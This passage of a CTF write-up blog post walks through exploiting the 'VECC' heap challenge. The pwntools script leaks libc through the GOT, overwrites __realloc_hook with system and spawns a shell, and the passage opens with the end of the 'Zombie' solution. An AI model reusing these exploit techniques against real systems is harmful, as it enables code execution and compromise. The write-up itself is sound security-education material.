        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        counter <span class="token operator">+=</span> <span class="token number">1</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span>

brains<span class="token punctuation">(</span><span class="token string">"get flag  "</span><span class="token punctuation">)</span></code></pre>
<p>Note the additional spaces at the end of the command, this will overwrite the “ns” in “brains” and cause the <code>.trim()</code> method to trim the command down to “get flag”, which then prints the flag.</p>
<h2 id="7-VECC"><a href="#7-VECC" class="headerlink" title="7-VECC"></a>7-VECC</h2><p>This is a hard heap exploitation challenge.</p>
<p>The idea is to first obtain a read/write primitive on the heap, then progressively leak data until you know the location of libc, then overwrite the <code>__realloc_hook</code> to call <code>system(/bin/sh)</code>.</p>
<h3 id="1-Identifying-the-vulnerability"><a href="#1-Identifying-the-vulnerability" class="headerlink" title="1 - Identifying the vulnerability"></a>1 - Identifying the vulnerability</h3><p>The first thing to note when inspecting the binary logic is that bounds are being checked correctly so we have no buffer overflows or heap corruption, and there are no obvious double-frees or use-after-frees, however there is the glaring vulnerability that allocations are never zeroed and we must leverage this and only this to get a shell.</p>
<h3 id="2-The-essence-of-the-vulnerability"><a href="#2-The-essence-of-the-vulnerability" class="headerlink" title="2 - The essence of the vulnerability"></a>2 - The essence of the vulnerability</h3><p>For this exploit all you need is the tcache. There are the <code>vecc</code>s - which are simillar to c++’s <code>std::vector</code> or rust’s <code>Vec</code>. This is a small struct with a pointer (to a buffer), a length (of the used portion of the buffer), and a capacity (the maximum buffer length before reallocation is necessary). When a vecc is first created all fields should be NULLed to signal that a new buffer must be allocated upon first usage.</p>
<p>The key here is to notice that since allocations are not zeroed it is possible to groom the stack, then allocate a vecc from a tcache chunk without erasing the data on it.</p>
<p>This means that your allocated struct will leave the pointer as the <code>fd</code> pointer of the chunk from the tcache, as well as leaving the length and capacity unchanged from when the chunk was freed.</p>
<p>Furthermore since we have some control over the stack, it is possible to force this chunk <code>fd</code> pointer to point to another vecc struct as if it was the buffer of our new allocation.</p>
<pre><code> A                  B
+-----------+      +-----------+      +-----------+
| buf +----------&gt; | buf +----------&gt; | actual    |
+-----+-----+      +-----+-----+      | buffer    |
| len | cap |      | len | cap |      |           |
+-----+-----+      +-----+-----+      +-----------+</code></pre>
<p>Once we have the above structure we are free to use A to overwrite all 3 fields of B as if it was a regular byte buffer, then use B to read or write data at will.</p>
<p>This is made a little more difficult in that we do not have arbitrary write on the buffer of any of our veccs, instead we only have the ability to clear and append to the buffers.</p>
<p>The clear operation simply zeroes the <code>len</code> field of the struct and does nothing else.</p>
<p>The append operation is a little more complicated, it:</p>
<ul>
<li>Allocates a temporary buffer of user defined size n</li>
<li>Reads n bytes into the temporary buffer</li>
<li>Checks whether <code>len</code> + n &gt; <code>cap</code> - this would overflow the buffer</li>
<li>If necessary reallocates the vecc’s buffer to the next power of 2 size that would fit the existing buffer and the n new bytes while copying the data across, <code>cap</code> it also updated</li>
<li>Append the user data from the temporary buffer to the vecc’s buffer now that we’re sure we can not overflow it</li>
<li>Free the temporary buffer</li>
<li>Update the <code>len</code> to reflect the size of the new used portion of the buffer</li>
</ul>
<p>The end result is that a temp buffer is allocated and freed, and the vecc’s buffer is possibly reallocated to fit the required size, then the user data is appended to the vecc’s existing data.</p>
<p>Once we have our crafted heap structure we can use a clear, followed by an append to overwrite the entire vecc struct at will.</p>
<h3 id="3-The-exploit"><a href="#3-The-exploit" class="headerlink" title="3 - The exploit"></a>3 - The exploit</h3><p>For this exploit we first do some housekeeping since we have a shell</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">exit_proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_vecc</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">destroy_vecc</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">append_vecc</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> readline<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buffer<span class="token punctuation">)</span>
    <span class="token keyword">if</span> readline<span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">clear_vecc</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show_vecc</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># p = remote("localhost", 1337)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"../publish/vecc"</span><span class="token punctuation">)</span></code></pre>
<p>This simply reflects all of the shell commands we might need to use. Now lets get to grooming the heap for our primitive.</p>
<pre class=" language-python"><code class="language-python">create_vecc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
append_vecc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> b<span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span></code></pre>
<p>We first create a vecc struct then append bytes to it.</p>
<p>It is important to write 0x10 bytes to this buffer since our aim is to have this buffer later interpreted as a vecc struct. For this to work we must make sure that it will be placed in the same tcache bin as a vecc struct would and therefore we should match the size of the vecc struct.</p>
<p>Note that this will also allocate and free a temporary buffer of size 0x10 while user data is read in, we now have 1 chunk in the tcache.</p>
<pre class=" language-python"><code class="language-python">destroy_vecc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
<p>After this line first the vecc’s buffer will be freed, then the vecc will be NULLed and freed.</p>
<p>Now the tcache looks like this:</p>
<pre><code>tcachebin:

(was vecc)         (was buffer)       (was temp)
+-----------+      +-----------+      +-----------+
| fd  +----------&gt; | fd  +----------&gt; | fd = NULL |
| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |
| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |
+-----------+      +-----------+      +-----------+</code></pre>
<p>Finally we complete our crafted structure:</p>
<pre class=" language-python"><code class="language-python">create_vecc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
create_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
create_vecc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre>
<p>Now we have allocated back from the tcache with some new structure:</p>
<pre><code> 1                  2                  3
+-----------+      +-----------+      +-----------+
| buf +----------&gt; | buf +----------&gt; | buf = NULL|
+-----+-----+      +-----+-----+      +-----+-----|
| 000 | 000 |      | AAA | AAA |      | AAA | AAA |
+-----+-----+      +-----+-----+      +-----------+</code></pre>
<p>Since 1 has capacity 0 any write will resule in a reallocation, so we don’t touch 1 from now on, but now with 2 and 3 we have the same structure as in the original diagram - we are able to use 2 to overwrite the entire of 3, then utilise 3 for arbitrary read / write.</p>
<p>Now we know we have PIE disabled, therefore we are able to leak libc addresses from the GOT.</p>
<pre class=" language-python"><code class="language-python">puts_got <span class="token operator">=</span> <span class="token number">0x601fa0</span>
clear_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
append_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"AAAA"</span><span class="token punctuation">)</span>
puts_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>show_vecc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Puts address: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

free_got <span class="token operator">=</span> <span class="token number">0x601f90</span>
clear_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
append_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"AAAA"</span><span class="token punctuation">)</span>
free_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>show_vecc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Free address: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_libc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>This is enough to figure out the version of libc being used and the location of any other symbols needed.</p>
<pre class=" language-python"><code class="language-python">libc_base <span class="token operator">=</span> puts_libc <span class="token operator">-</span> <span class="token number">0x809c0</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4f440</span>
realloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3ebc28</span>
str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1b3e9a</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Realloc hook address: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>realloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>Now we overwrite our realloc hook with the address of <code>system</code>.</p>
<pre class=" language-python"><code class="language-python">clear_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
append_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>realloc_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"AAAA"</span><span class="token punctuation">)</span>
append_vecc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>Finally, we overwrite the buffer pointer of one of our vecc structures with a pointer to “/bin/sh” from within libc, then trigger a reallocation by appending a single extra byte, giving us a shell.</p>
<pre class=" language-python"><code class="language-python">clear_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
append_vecc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
append_vecc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">,</span> readline<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">i0gan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.i0gan.cn/2020/09/22/wp-down-under-ctf/">http://blog.i0gan.cn/2020/09/22/wp-down-under-ctf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="/img/text_bg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/26/wp-jk-2020/"><img class="prev-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">极客巅峰2020</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/13/kernel-pwn-env/"><img class="next-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">kernel pwn环境搭建</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/11/08/tiesan-2020/" title="tiesan 2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-08</div><div class="title">tiesan 2020</div></div></a></div><div><a href="/2020/09/02/wp-2020-ciscn/" title="2020 CISCN PWN WP"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-02</div><div class="title">2020 CISCN PWN WP</div></div></a></div><div><a href="/2020/06/18/wp-hfb-2020/" title="wp-hfb-2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-18</div><div class="title">wp-hfb-2020</div></div></a></div><div><a href="/2020/11/06/wp-nssc-2020/" title="NSSC 2020 CTF"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-06</div><div class="title">NSSC 2020 CTF</div></div></a></div><div><a href="/2020/09/26/wp-jk-2020/" title="极客巅峰2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-26</div><div class="title">极客巅峰2020</div></div></a></div><div><a href="/2020/10/18/wp-nu1lctf-2020/" title="wp-nu1lctf-2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-18</div><div class="title">wp-nu1lctf-2020</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">i0gan</div><div class="author-info__description">Even if a man has reached the top, he still needs to improve himself</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/i0gan"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DownUnderCTF-PWN-WP"><span class="toc-number">1.</span> <span class="toc-text">DownUnderCTF PWN WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-shellthis"><span class="toc-number">1.1.</span> <span class="toc-text">1 [shellthis]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-return-to-what"><span class="toc-number">1.2.</span> <span class="toc-text">2 [return-to-what]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-echos"><span class="toc-number">1.3.</span> <span class="toc-text">3 [echos]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-return-to-whats-revenge"><span class="toc-number">1.4.</span> <span class="toc-text">4 [return-to-whats-revenge]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-is-this-pwn-or-web"><span class="toc-number">1.5.</span> <span class="toc-text">5 [is-this-pwn-or-web]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js-exp"><span class="toc-number">1.5.1.</span> <span class="toc-text">js exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Zombie"><span class="toc-number">1.6.</span> <span class="toc-text">6 [Zombie]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Challenge"><span class="toc-number">1.6.1.</span> <span class="toc-text">The Challenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Exploit"><span class="toc-number">1.6.2.</span> <span class="toc-text">The Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-VECC"><span class="toc-number">1.7.</span> <span class="toc-text">7-VECC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Identifying-the-vulnerability"><span class="toc-number">1.7.1.</span> <span class="toc-text">1 - Identifying the vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-The-essence-of-the-vulnerability"><span class="toc-number">1.7.2.</span> <span class="toc-text">2 - The essence of the vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-The-exploit"><span class="toc-number">1.7.3.</span> <span class="toc-text">3 - The exploit</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/01/wp-hws/" title="华为夏令营 wp"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="华为夏令营 wp"/></a><div class="content"><a class="title" href="/2021/02/01/wp-hws/" title="华为夏令营 wp">华为夏令营 wp</a><time datetime="2021-01-31T16:22:49.000Z" title="Created 2021-02-01 00:22:49">2021-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/08/wp-huawei-xctf-2020/" title="HUAWEI XCTF 2020 PWN WRITE UP"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HUAWEI XCTF 2020 PWN WRITE UP"/></a><div class="content"><a class="title" href="/2021/01/08/wp-huawei-xctf-2020/" title="HUAWEI XCTF 2020 PWN WRITE UP">HUAWEI XCTF 2020 PWN WRITE UP</a><time datetime="2021-01-08T06:43:24.000Z" title="Created 2021-01-08 14:43:24">2021-01-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/06/axb2020/" title="Some small records of the I-SOON Cup Of CUIT CTF Competition final"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Some small records of the I-SOON Cup Of CUIT CTF Competition final"/></a><div class="content"><a class="title" href="/2020/12/06/axb2020/" title="Some small records of the I-SOON Cup Of CUIT CTF Competition final">Some small records of the I-SOON Cup Of CUIT CTF Competition final</a><time datetime="2020-12-06T10:42:47.000Z" title="Created 2020-12-06 18:42:47">2020-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/24/wp-xyb-2020/" title="祥云杯 2020 WP"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="祥云杯 2020 WP"/></a><div class="content"><a class="title" href="/2020/11/24/wp-xyb-2020/" title="祥云杯 2020 WP">祥云杯 2020 WP</a><time datetime="2020-11-24T14:47:47.000Z" title="Created 2020-11-24 22:47:47">2020-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/15/issues/" title="issues"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="issues"/></a><div class="content"><a class="title" href="/2020/11/15/issues/" title="issues">issues</a><time datetime="2020-11-15T13:36:30.000Z" title="Created 2020-11-15 21:36:30">2020-11-15</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/text_bg.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By i0gan</div><div class="framework-info"></div><div class="icp"><a target="_blank" rel="noopener" href="http://www.beian.gov.cn/"><img class="icp-icon" src="/img/icp.png" alt="ICP"/><span>黔ICP备20006037号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>